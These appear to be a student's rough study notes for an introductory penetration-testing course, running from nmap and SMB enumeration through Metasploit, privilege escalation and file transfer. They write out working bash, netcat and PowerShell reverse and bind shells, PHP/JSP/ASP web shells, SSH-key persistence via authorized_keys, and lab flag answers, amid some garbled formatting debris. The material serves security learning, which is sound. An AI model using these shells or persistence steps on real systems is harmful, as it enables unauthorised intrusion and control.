\  
we should maintain checklists, report templates for various assessment type, and build a finding/vul db. this db can take the form of a spreadsheet or smt more complex and include a finding title, description, impact, remediation advice, and references, so we can utilize next time

\\connecting using VPN

2 main type of remote access VPNs: client-based VPN and SSL VPN. SSL VPN

-SSL VPN  uses the web browser as the VPN client. No require install  can be config to only allow access we based or so on

\\why use A VPN

we use service such as NortVPN or Private Internet Access and connect to a VPN server in another part of our country or another region to obscure our browsing traffice or disguise public IP

\\Connecting to VPN

-$sudo openvpn user.ovpn waiting for Initialization squence completed

after that check whether connected to VPN by $ifconfig check for tun adapter

typing $netstat -rn will sow the network accessible via VPN

\\Common terms

\\What is a shell

on a linux system, the shell is a program that take input the user via the keyboard and passes these commands to the OS to perform a specific function.

Most linux systems use a program called Bash (bourne Again Shell) as a shell program to interact with the OS

-the term "getting a shell" on a box mean that the target host has been exploited, a shell may be obtained by exploiting a web app or network/service vul or obtaining credentials and logging into the target host remotely.

-there are 3 main types of shell connections:

Shell type                Description

Reverse Shell                initiates a connection back to a "listener" on our attack box

Bind shell                "Binds" to a specific port on the target host and waits for a connection from our attack box

Web shell                Run OS command via the web browser, typically not interactive or semi-interactive. it can also be used to run single command(ie leveraging a file upload vul and uploading a PHP script to run a single command

\\What is a Ports

A port can be thought of as a window or door on a house(the house being a remote system) if a window or door is left open or not locked correctly,

-ports are virtual points where network connection begin and end.they are software-based and managed by the host OS. port are associated with a specific process or service and allow computers to diff betw diff traffic types (SSH traffic flows to a diff port than web requests to access a website even though the access request are sent over the same netowrk conn

-each port is assigned a number, and many are standardized across all network-connected devices (though a service can ce config to run on a non-standard port) EX: HTTP massages (web traffic) typically go to port 80, while HTTPS messages goto port 443 unless config otherwise

-port help computer understand how to handle the various types of data they receive

-There are 2 categories of ports, Transmission Control Protocol (TCP), and User Datagram Protocol (UDP).

TCP can significantly affect a real-time system, there are 65535 TCP ports and 65535 diff UDP ports each denoted by a number

| Port(s) | Protocol |
| --- | --- |
| `20`/`21` (TCP) | `FTP` |
| `22` (TCP) | `SSH` |
| `23` (TCP) | `Telnet` |
| `25` (TCP) | `SMTP` |
| `80` (TCP) | `HTTP` |
| `161` (TCP/UDP) | `SNMP` |
| `389` (TCP/UDP) | `LDAP` |
| `443` (TCP) | `SSL`/`TLS` (`HTTPS`) |
| `445` (TCP) | `SMB` |
| `3389` (TCP) | `RDP` |

\\What is a Web Server

-is an appllication that runs on the back-end server, which handles all of the HTTP traffic from the client-side browser, routes it to the requests destination pages, and finally responds tothe client-side browser.

- Web server usually run on TCP ports 80 or 443 and are responsible for conn end-users to various parts of the web app in

\\Top 10 vul can affect web app OWASP

&nbsp;

| Number | Category | Description |
| --- | --- | --- |
| 1.  | [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) | Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc. |
| 2.  | [Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) | Failures related to cryptography which often leads to sensitive data exposure or system compromise. |
| 3.  | [Injection](https://owasp.org/Top10/A03_2021-Injection/) | User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc. |
| 4.  | [Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/) | These issues happen when the application is not designed with security in mind. |
| 5.  | [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) | Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information. |
| 6.  | [Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/) | Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date. |
| 7.  | [Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) | Authentication-related attacks that target user's identity, authentication, and session management. |
| 8.  | [Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/) | Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs). |
| 9.  | [Security Logging and Monitoring Failures](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/) | This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected.. |
| 10. | [Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) | SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL). |

\\Basic Tools

SSH, Netcat, Tmux, Vim are essential and are used daily by most information security professionals. although these tools are note intended to be pentest tools. -> must master

\\Using ssh

is a network protocol that runs on port 22 by default and provides user such as system admin a secure way to access a computer remotely.

-SSH can used to remotely access system on the same network. over the internet, facilitate connections to resource in other networks using port forwarding/proxying, and upload download files to and from remote systems

-SSH uses a client-server model, conn a user running an SSH client app such as OpenSSH to an SSH server. While atk a box or during  a real-worl .

-an SSH conn is typically much more stable than a reverse shell conn and can often be used as a jump host to enumerate and atk other host in network, transfer tools, setup persistence, etc

$ssh username@10.10.10.10

\\Using Netcat

Netcat, ncatm or nc is network utility for interacting with TCP/UDP ports. it can be used for many things during a pentest

-primary usage is for conn to shells,

-nc can be used to conn to any listening port and interact with the service running on that port. EX SSH is programed to handle conn over port 22 to send all data and keys. we can conn to TCP port 22 with netcat:

$netcat 10.10.10.10 22 then port 22 will sent us its banner, stating that SSH is running on it. this technique called Banner grabbing. it also help to identify what service is running on particular port.

Netcat pre-installed in ost linux another netcat coded in powershell called PowerCat

Netcat can also be used to transfer files betw machines

-another similar network utility is socat. which has a few features that netcat doesn't support, like forwarding ports and conn to serial devices.

-Socat is very handy utility that should be a part of every pentest tester tool kit. A  standalone binary of socat canbe transferred to a systems after obtaining remote code execution to get a more stable reverse shell conn

\\Using Tmux

-Terminal multiplexers like tmux or screen are utilities for expanding a standard Linux terminal's features, like multi windows within one terminal and jumping betw them.

$tmux  it also support logging

\\Using Vim

Vim is greate tex editor can be use without mousing

$vim /etc/hosts

insert by hit i --insert--

esc -> to get out of insert mode, back to normal mode. when in normal mode use some useful shortcut

| Command | Description |
| --- | --- |
| `x` | Cut character |
| `dw` | Cut word |
| `dd` | Cut full line |
| `yw` | Copy word |
| `yy` | Copy full line |
| `p` | Paste |

multiple any command to run multiple times by adding a number before it EX 4yw

: for command mode

$test: Apply what you learned in this section to grab the banner of the above server and submit it as the answer. -> $netcat <ip> <port>

\\Service scanning

\\Nmap

-most basic scan $nmap <ip> the result will come soon dueto it don't specify any additional options. nmap will only scan the 1000 most common ports. the scan will show reveals port available

$nmap -sV -sC -p- 10.129.42.253

-the vul https://<ip>/index.php

\\Nmap scripts

-sC will run many useful default scripts against a target but there are cases running a specific script is required

EX: in an assessment scope, we may be asked to audit a large Citrix installation. we could use Nmap script to audit for the servere Citrix NetScaler Vulnerability (CVE-2019-19781), while Nmap also has other scripts to audit a Citrix Installation

$locate scripts/citrix the syntax for running on Nmap script is

$nmap --script <script name> -p<port> <host>

\\\Attacking Network Services

\\Banner Grabbing

$nmap -sV --script=banner <target> is specified. or manually using Netcat

$nc -nv <ip> <port>

$nmap -sV --script=banner -p21 <ip>/24

\\FTP

it is a standard port and often contain interesting data (stm leak Pub directory is available)

$nmap -sC -sV -p21 <ip>

nmanmap-connect to the service using the ftp command-line utility

$ftp -p <ip>

-ftp supports common commands such as cd and ls allow us to download files using the get command. inspection of the downloaded login.txt reveals credentials that we could use to further our access to the system

$cat login.txt

\\SMB (server message block) is a prevalent protocol on Windows machines that provide many vectors for vertical and lateral movement. sensitive data, including credentials, can be network file shares, and some SMB versions maybe vulnerable to RCE exploits such as EternalBlue. is crucial enum this sizeable potential atk surface.

-Nmap has many scripts for enum SMB, such as smb-os-discovery.nse , which will interact with the SMB service to extract the reported OS sersion

$nmap --script smb-os-discovery.nse -p445 <ip>

in case the host runs a legacy window 7 OS. we could conduct further enum to confirm if it is vul to Eternalblue

-the Metasploit Framwork has several modules for EternalBlue that can be used to validate the vul and exploit it

$nmap -A -p445 <ip>

\\Shares SMB allows users and admin to sharefolder and make them accessible remotely by other user. often these shares have file in them that contain sensitive information such as passwords.

- A tool that can enumerate and interact with SMB shares is smbclient. the -L flag specifies we want retrieve a list of available shares on the remoe host, while -N suppresses password prompt

$smbclient -N -L \\\\<ip>

- this reveals the non-default share users let us attempt to connect as the guest user

$smbclient \\\\<ip>\\users

-the ls command resulted in an access denied message,including that guest access is not permitted try again using credentials for the user bob (bob:Welcome1)

$smbclient -U bob \\\\<ip>\\users

we successfully gained access to the users share using credentials and gained access to the interesting file passwords.txt which can be downloaded with the get command

\\SNMP

comm strings provide infor and statistics about a router or device, the manufacturer default comm strings of public and private are often unchanged. in SNMP versions 1 and 2c, access is controlled using a plaintext com strings. if we know the name we can gain access to it.encryption and authentication were only added in SNMP version 3.

$snmpwalk -v 2c -c publicj <ip> 1.3.6.1.2.1.1.5.0

$snmpwalk -v 2c -c private <ip>

a tool such as onesixtyone can be used to bruteforece the comm string names using dir file of common comm strings such as the dict.txt file included in Github repo for the tool

$onesixtyone -c dict.txt <ip>

$test

Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080? => sudo nmap -sV -p<port> <ip>

List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file.

=>$smbclient -N -L \\\\\\\\&lt;ip&gt; =>$

KaTeX parse error: Expected 'EOF', got '&' at position 25: … -N -L \\\\\\\\&̲lt;ip&gt; =>

KaTeX parse error: Expected 'EOF', got '&' at position 25: … -N -L \\\\\\\\&̲lt;ip> =>

KaTeX parse error: Expected 'EOF', got '&' at position 25: … -N -L \\\\\\\\&̲lt;ip> =>

KaTeX parse error: Expected 'EOF', got '&' at position 25: … -N -L \\\\\\\\&̲lt;ip> =>

smbclient -U bob \\\\STMIP\\users

get \flag\flag.txt

\\\\Web Enumeration

\\Gobuster

after disco a web app. it is always worth checking to see if we can uncover any hidden files or dir on the webserver that are not intended for public access.

use ffuf or GoBuster to perform this dir enumeration.

\\Directory/File Enumeration

Gobuster is a versatile tool that allows for performing DNS, vhost, and directory brute-forcing. the tool has additional functionality . such as enum of public aws s3 buckets

-in this we are dir files brute-forcing modes specified with the switch dir scan using the dirb common.txt wordlist

$gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

\\DNS Subdomain enumeration

we can use GoBuster to enum avilable subdomains of a given domain using the dns flag to specify DNS mode,

\\install seclist : $ git clone https://github.com/danielmiessler/SecLists

sudo apt install seclists -y => add a DNS server such as 1.1.1.1 to the /etc/resolv/conf file we will target the domain inlanefreight.com

$gobuster dns -d inlanefreight.com -w /usr/share/seclists/Discovery/DNS/namelist.txt

-this scan reveals several interesting subdomains that could examine further.

\\Web Enumeration Tips

\\Banner grabbing / Web Server Headers

-use cURL to retrieve server header information from the command line cURL

$curl -IL https://www.inlanefreight.com

-another handy tool is EyeWitness, which can be used to take screenshots of target web app fingerprint them and identify possible default credentials

\\\Whatweb

extract the version of web servers, supporting frameworks, and applications using the command-line tool whatweb. This information can help us pinpoint the technologies in use and begin to search for potential vul

$whatweb 10.10.10.121

$whatweb --no-errors 10.10.10.0/24

\\\Certificates

SSL/TLS certificates are another potentially valuable source of information if HTTPS is in use. Browsing to HTTPS://<ip> and viewing the certificates reveals the detail. this potentially be used to conduct a phishing atk

\\Robots.txt

it is common for websites to contain a robots.txt file, whose purpose is to instruct search engine web crawlers such as googlebot which resources can and cannot be accessed for indexing. the robots.txt file can provide valuable infor such as the location of private files and admin pages. EX robots.txt file contain 2 disallowed entries

User-agent: * Disallow: /private Disallow: /upload_files => navigating to https://10.10.10.121/private to get a admin login page

\\Source code it worth to come across

Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.

=> $gobuster dir -u https://<ip>:<port> -w /usr/share/wordlists/dirb/common.txt -t 40 -q (t: number threat used -q:quitely not display error) => navigate /robot.txt => found disabllow entry

\\\\Public Exploits

once we identify the services running on ports identified from Nmap scan, the first step is to look if any of app/services have any public exploits.

-public exploits can be found for web app and other app running on open ports/ like SSH or ftp

\\Finding Public exploits

-finding exploit by gooogle EX search for windows 7 SMB exploit

-a well-known tool for this purpose is searchsploit, which we can use to search for public vul/exploits for any app

-install it by $sudo apt install exploitdb -y ==> searchsploit openssh 7.2 => searchsploit -x exploits/linux/....

or copy locally $searchsploit -m exploits/linux/remote/....

-or utilize online exploit databases to search for vul, like Exploit DB, Rapid7 DB, or Vulnerability Lab.

\\\Metasploit Primer (metasploit framework MSF)

-it contain many built-in exploits for many public vuls and provides an easy way to use these exploits against vul targets. it contain other feature line:

-running reconaissance scripts to enum remote hosts and compromissed targets

- verification scripts to test the existence of a vul without actually compromising the target

-meterpreter, which is a great tool to connect to shells and run commands on the compromissed targets

-Many post-exploitation and pivoting tools

EX: $msfconsole

msf6$search exploit eternalblue

NOTE: we can search complex filters such as search cve:2009 type:exploit. see all the filter with help search

=>after found one exploit for this service. we use it by copying the full name of it and using USE:

$use exploit/windows/smb/ms17_010_psexec

=>before run exploit, we need to config its option we can use $show options command to view available op

$show options exploit/windows/smb/ms17_010_psexec

&nbsp;

&nbsp;
\\update
Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)
Students first need to navigate to the root webpage of the spawned target machine to discover that it uses the Simple Backup Plugin 2.7.10 plugin for WordPress:
The first result in Google for searching Simple Backup Plugin 2.7.10 is a guide from Rapid7 that explains how to use the Metasploit module auxiliary/scanner/http/wp_simple_backup_file_read to exploit the directory traversal vulnerability in the plugin:
$msfconsole -q
use auxiliary/scanner/http/wp_simple_backup_file_read
set RHOSTS STMIP
set RPORT STMPO
set FILEPATH /flag.txt
exploit
\\\\Type of shells
once compromise a system and exploit a vul to execution command on compromise host remote we usually need a method of comm with the system not to have to keep exploiting the same vul to execute each command
-to enumerates the system or take further control over it or within its network -> we need a reliable conn that gives direct access to the system sheell
Bash or Powershell 
-one way to conn to a compromise system is through network protocols like SSH for linux or WinRM for windows, which would allow us a remote login t the compromise
system hower unless we obtain a working set of login credentials, we would not be able to utilize these methods without executing commands on the remote system first.
-other method of accessing a compr host for control and remote code execute is through shells as previously discussed 
+Reverse shelll +Bind shell + Web shell . each of these shells has a different method of comm with us for accepting and executing our command
type of sheel 						Method of comm
Reverse shell 						Connect back to our system and gives us control through a reverse conn
Bind Shell 							Waits for us to connect to it and give control once we do
Web shell 								Comm through a web server, accepts our command through HTTP parameters, execute them and prints back the output
\\Reverse Sheel
most common type of shell, as it is the quickest and easiest method to obtain control over a compromissed host. once we identify a vul on the remote host that allows remote code execute.
we can start a netcat listener on our machine that lstens on a specific port,  say port 1234. with this listener in place, we can execute a reverse shell command that connect
the remote system shell ie Bash or PowerShell to our netcat listener, which gives a reverse conn over the remote system
\\netcat listener
$nc -lvnp 1234	
Flag			Description
-l				Listen mode, to wait for a conn to connect to us
-v 			Verbose mode, so that we know whe we receive a conn
-n 			Disable DNS resolution and only connect from/to IPs, to speed up the conn
-p 1234		Port number netcat is listening on, and the reverse conn should be sent to
\\Connect back IP
$ip a  -> check for network interface
\\Reverse Shell command
depend on what OS we atk what app and commands we can access
$reverse shell cheat sheet : https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
certain reverse shell commands are mote reliable than others and can usually be attempted to get a reverse conn.
EX: get a reverse conn for bash on Linux compromised hosts and Powershell on windows compromised hosts
$bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
$rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
-Powershell
$powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
execute above scipt through python exploit or a Metasploit module, to get a reverse connection. Once we do, we should receive a connection in our netcat listener
$nc -lvnp 1234
after we received a conn on our netcat listener, we were able to type our command and direct get its output back 
-A reverse shell is handy when we want to get a quick, reliable conn to our compromissed host.
however a reverse shell can be very fragile. once the reverse shell command is stopped, or if we lose our conn for any reason, we would have to use the initial exploit to exe the reverse shell comand again to regain our access
\\Bind shell
unlike reverse shell that conn to us, we will have to conn to it on the targets' listening port
-once it execute it will start listerning on a port on the remote host and bind that host's shell ie Bash or Powershell to that port
- we have to connect to that port with netcat, and we will get control through a shell
\\Bind Shell Command
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#python
NOTE: we will start a listerning conn on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere
-The following are reliable commands we can use to start a bind shell:
$rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
Python$python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
Powershell$powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
\\Netcat connection
once execute the bind shell command, we should have a shell waiting for us on the specified port. we can connect to it
we can use netcat to connect to that port and get a connection to the shell:
$nc 10.10.10.1 1234
-> we direct dropped into a bash, unlike reverse shell if conn drop we can conn back to it and get another conn immediately.
anyway when the remote host is rebooted we will lose our access to it 
\\Upgrading TTY
once we connect to a shell through Netcat, we will notices that we only type command or backspace, cannot move text cursor
we need to upgrade our TTY this canbe achived by mapping our terminal TTY with the remote TTY
-there some method to upgrade TTY like python/stty method.
$python -c 'import pty; pty.spawn("/bin/bash")'
-> ctrl + z to background our shell and get back on our local terminal and input stty command
$^Z    ->   $stty raw -echo    -> $fg 
once we hit fg, it will bring back our netcat shell to the foreground, at this point, the terminal will show a a blank line
-modify terminal by 
$echo $Terminal
$stty sizeable
the first command showed us the TERM variable, and the second shows us the values for rows and columns respectively. now that we have our variable, 
$export TERM=xterm-256color
$stty rows 67 columns 318
now we have a netcat shell with full feature like SSH conn
\\Web Shell
it typically a web script, i.e PHP or ASPX, that accepts our command through HTTP request parameters such as GET or post
request parameters, executes our command, and prints its output back on the webpage
\\Writting a web shell
we write our web shell that would take our command through a GET request, execute it, and print its output back, A web shell script is typically a one-liner that is very short and can be memorized easily 
php$<?php system($_REQUEST["cmd"]); ?>
JSP$<% Runtime.getRuntime().exec(request.getParameter("cmd)); %>
asp$<% eval request("cmd") %>
\\Uploading a Web shell
execute the cript through the web server. this can be through a vul in an upload feature, which would allow us to write one of our shells to a file,
i.e shell.php and upload it, and then access our uploaded file to execute commands
-hwer if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web
. so the first step is to identify where the webroot is. the following are the default webroots for common web server
Web server              Default webroot
Apache                  /var/www/html/
Nginx                   /usr/local/nginx/html
IIS                     c:\inetpub\wwwroot\
XAMPP              c:\xampp\htdocs\
we can check these dir to see which webroot is inuse and then use echo to write out our web shell
EX: if we atking a Linux host running Apache, we can write a PHP shell
bash$ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
\\Accessing Web Shell
once we write our web shell, we can either access it through a browser or by using cURL, we can visit the shell.php page
on the compromised website, and use ?cmd=id to execute the id command"
http://SERVER_IP:PORT/shell.php?cmd=id
-another options is to use cURL
$curl http://SERVER_IP:PORT/shell.php?cmd=id
now changin command to get its output. web shell will bypass any firewall restricted in place, as it will not open a new conn
on a port but run on the web port on 80 or 443, or whatever port the web app is using.
-if a comprimissed hos tis reboot the web shell still in place
webshell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our command
in extrem cases, it is possible to code a python script to automate this process and give us a semi-interactive web shell right within out terminal


\\\\Privileged escalation
-cheat sheet: https://book.hacktricks.wiki/en/index.html
- check list for both lĩnux and Window local privileged https://github.com/swisskyrepo/PayloadsAllTheThings
\\enumeration script
-common linux enum scripts include LinEnum and linuxprivchecker,
- common window include Seatbelt and JAWS
- another useful tool for server enumeration is Privilege Escalation Awesome Script SUITE (PEASS), as it is well maintained to remain
up to date and includes scripts for enumerating both linux and windows
NOTE: these script will run many commands known for identifying vuls and create a lot of "noise" that may trigger anti-virus soft or security monitoring soft
that look for these types of events. this may prevent the script from rnning or even trigger an alarm that the system has been compromissed. in some instance, 
we may want to do a manual enum instead o running scripts
-EX: of running the linux scripts from PEASS called LinPEAS
$./linpeas.sh
-> the script collecting infor and display it and report
\\Kernal exploits
when ever OS old -> looking for potential kernel vul
EX: we found linu kernel 3.9.0-73-generic  -> msf6 console -> searchsploit 3.9.0-73-generic -> we will find CVE-2016-5195 otherwise known as DirtyCow
search for and download the DirtyCow exploit and run it on the server to gain root access
=> tesst on lab and get approval with explicit, coordination 
\\Vulnerable Software
check installed software EX: $ dpkg -l command on linux or look at C:\Program Files 
searchsploit for exploiting identified
\\User Privileges
-in somecase we may able to escalate our privileges to root/system users or gain access as diff user. below are some common ways to exploit certain user privileges
+sudo    +SUID		+Windows Token Privileges
-The sudo command in Linux allows a user to execute commands as a diff user. it is usually used to allow lower privileged users to execute commands
as root without giving them access to the root user.
-this is generally done as specific commands can only be run as root like $tcpdump or allow the user to access certain root-only dir. we can check what sudo privileges we have
$sudo -l  -> $sudo su -l -> check for password properties 
-> $sudo -u user /bin/echo hello world
- once we find a specific app run with sudo, we can look for ways to exploit itto get a shell as the root user.
-GTFOBins https://gtfobins.github.io/ contains a list of commands and how they can be exploited through sudo, search for app we have sudo privileged over.
-> it may tell us the exact command we should execute to gain root access using the sudo privileges we have
- LOLBAS https://lolbas-project.github.io/# also contains a list of window app which we may be able to leverage to perform certain function like downloading fils or executing command in the context of a pri user
\\Scheduled Task
methods to have script run at specific intervals to carry out a task. Scheduled task (windows) or cron jobs (linux) to escalate our privileged
1. add new scheduled task/cron jobs
2. Trick them to execute a malicious software
-the easiest way to check if we are allowed  to add new scheduled tasks -> there are specific dir tat we may be able to utilize to add new cronjobs if we have the write permissions over them
1. /etc/crontab
2. /etc/cron.d
3. /var/spool/cron/crontabs/root
<> if we can write to a dir called b a cron job -> we can write a bash script with a reverse shell command, which should send us a reverse shell when executed
\\Exposed credentials
look fr any exposed credentials. thiss is very common with configuration files, log files, and user history files (bash_history in linux and PSReadLine in Windows)
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
-> check for reuse password
\\SSH Keys
<>if we have read access over te .ssh dir for specific user -> read their private ssh key found in /home/user/.ssh/id_rsa or /roo/.ssh/id_rsa
-> use it to login to the server. 
<> if we can read /root/.ssh/ dir and can read the id_rsa file, we can copy it to our machine and use the -i flag to lo in with it:
$vim id_rsa
$chmod 600 id_rsa
$ssh root@10.10.10.10 -i id_rsa
Note that use command 'chmod 600 id_rsa' on the key after we created it on our machine to change the files perm tobe more restrictive/
<>if ssh keys have lax perm ie maybe read by other people, the ssh server would prevent them from working
<>if we find ourselves with write access to a users /.ssh/ dir, we can place our public key in the user's ssh dir at /home/user/.ssh/authorized_keys. this technique is usually used to gain ssh access after gaining a shell as that user
-the current SSH configuration will not accept keys written by other users, so it will only work if wehave gained over by that user
<1> create a new key with ssh-keygen and the -f flag to specify the output file:
$ssh-keygen -f key
-> this then gen 2 key which will use with ssh -i and key.pub, which we will copy to the remote machine
->copy key.pub then on the remote machine add it to /root/.ssh/authorized_keys:
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
-the remote server should allow us to log in as that user by using our private key:
$ssh root@10.10.10.10 -i key
<test>  SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.
-> $ssh username@ip -p <port> -> -> sudo -l  -> ##sudo su -
->sudo -u user2 /bin/bash -> sudo -u user2 /bin/bash -> whoami
cat ~/flag/txt
<test>Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.
$ls -lA / (need to know that they can access the root directory because it is misconfigured, given that the group to which it belongs to is user2)
-> cd /root -> ls -lA (After changing directories into the /root directory, students will notice that the .ssh/ directory, similar to the root directory, is also misconfigured:)
-> cd .ssh/ -> ls -lA
-need to abuse this misconfiguration by using SSH to login as the root user.
-need to know the active connections on the spawned target machine, and what ports they are listening on by using netstat, finding port 80 listening for connections:
-> $netstat -antpl
-Before attempting to connect to port 80, students can grab the banner of the service running using nc, finding it to be SSH (students can use Ctrl + c to exit from the connection):
-> $nc localhost 80 -> ssh as the root user via port 80
-> ssh -i id_rsa root@localhost -p 80  -> Y ->cat ~/flag.txt
\\\\Transfering Files===============================================
in pentest we will need to trans files to rhe remote server, such as enum scripts or exploits, or trans data back to our atk host
-while tools like metaspoit with a meterpreter shell allow us to use the upload command to upload file, 
\\Using wget
-one way is Python HTTP server on our machine and then using wget or cURL to download the file on the remote host
->first we go into the dir that contains the file we need to trans and run a python http server in it
$cd /tmp  -> $python3 -m http.server 8000
-Now we have setup a listening server on our machine, we can download the file on the remote host that we have code execution on
$wget http://10.10.14.1:8000/linenum.sh
-Now that used our ip 10.10.14.1 and port our python server on 8000. if the remote server does not have wget use curl to download it
$curl http://10.10.14.1:8000/linenum.sh -o lunenum.sh
\\Using SCP
-granted we have obtained ssh user credentials on remote host
$scp linenum.sh user@remotehost:/tmp/linenum.sh
- we specified the local file name after scp, and the remote dir will be saved to after the:.
\\Using Base64
-stm we not able to trans the file. ex the remote host may have firewall protections that prevent us from downloading
-use simple trick to base64 encode the file into base64 format,
-> paste the base64 string on the remote server and decode it. 
EX: transfer a binary file called shell, we can base64 encode it 
$base64 shell -w 0  <result>f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
->copy this base64 string, goto the remote host, and use base64 -d to decode it, and pipe the output into a file
$echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
\\validating File Transfers
run file command on it
$file shell <result>shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
-> it say that it is an ELF binary meaning successfully trans 
-> check md5 hash to ensure the file dont Broken
$md5sum shell
\\\\Starting out============================
\\Vulnerable machine/app
https://owasp.org/www-project-juice-shop/
https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
https://github.com/rapid7/metasploitable3
https://github.com/digininja/DVWA
\\youtube 
https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ
https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg
\\blog
https://0xdf.gitlab.io/
\\tutorial web
https://underthewire.tech/wargames
https://overthewire.org/wargames/
\\
https://app.hackthebox.eu/battlegrounds/lobby
/machine /challgenges /tracks
\\\\Nibbles - Enumeration
first step of all determine atk vector/ interface atk -> we must try to enumeration
->that why the through enumeration is critical and is often an iterative process
-Engagement         Description
black-box : no information provide/ only company name/ need indept reconaissance/ it is not as comprehensive as other assessment types and could leave misconfig/vul undiscovered
grey-box:   give certain infor/some ip/low level credential/AD/ this simulated insider or what atk can do with low level of access/atk looking for misconfig and attemp exploitation
white-box: give complete access/web admin account/source code,build diagram/look for logic vul and other difficult to discover flaws/ in network test they may be given admin level credential to dig into ad or other system for misconfig tha may otherwise be missed.
this assessment type is highly comprehensive as the tester will have access to both sides of a target and perform a comprehensive analysis
=========================================================================

\\\\Nmap
-quick scan for open port: $nmap -sV --open -oA nibbles_initial_scan <ip addr>
<exp> ---open scan top 1000 port
-check which port nmap scan no specified target $nmap -v -oG -
<exp>greppable format to stdout -oG - and -v verbose output since no target specified scan fail but will show port scanned
$nmap -v -oG -
$nmap -sV --open -oA nibbles_initial_scan <ip>
-full TCP port scan $nmap -p- --open -oA nibbles_full_tcp_scan <ip>
- banner grabbing to confirm what nmap tell us  $nc -nv <ip> <port>
-> run nmap script scan using the -sC flag these script can be intrustive, so it is always important to understand exactly how our tool work
$nmap -sC -p 22,80 -oA file_scan <ip> (since we know hich port open) -> nothing usefull
-> using http-enum script 
$nmap -sV --script=http-enum -oA file_scan <ip>
====================================================================
\\\\\Nibbles- Web Footprinting
\\what web
-identify the web app in use
